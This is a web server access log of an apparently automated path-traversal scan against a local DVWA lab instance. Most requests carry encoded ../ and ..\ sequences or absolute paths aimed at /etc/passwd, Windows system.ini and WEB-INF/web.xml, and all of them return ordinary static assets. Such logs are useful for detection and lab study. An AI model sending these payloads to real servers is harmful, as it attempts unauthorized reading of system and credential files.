172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 301 618 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=c%3A%2F HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=%2F HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=c%3A%5C HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/login.css?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=%2Fetc%2Fpasswd HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=%2Fetc%2Fpasswd HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=c%3A%2F HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=%2F HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=c%3A%5C HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=c%3A%2F HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/main.css?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=%2F HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=c%3A%5C HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images/?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 301 748 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images/?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 301 748 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/images/?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=%2Fetc%2Fpasswd HTTP/1.1" 301 578 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=%2Fetc%2Fpasswd HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 301 732 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=c%3A%2F HTTP/1.1" 301 562 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=c%3A%2F HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=%2F HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=%2F HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=c%3A%5C HTTP/1.1" 301 562 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=c%3A%5C HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 708 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=WEB-INF%2Fweb.xml HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=WEB-INF%5Cweb.xml HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /docs/DVWA_v1.3.pdf?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 301 624 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /docs/DVWA_v1.3.pdf?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /docs/DVWA_v1.3.pdf?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=%2Fetc%2Fpasswd HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=c%3A%2F HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=%2F HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=c%3A%5C HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /docs/DVWA_v1.3.pdf?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/login_logo.png?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
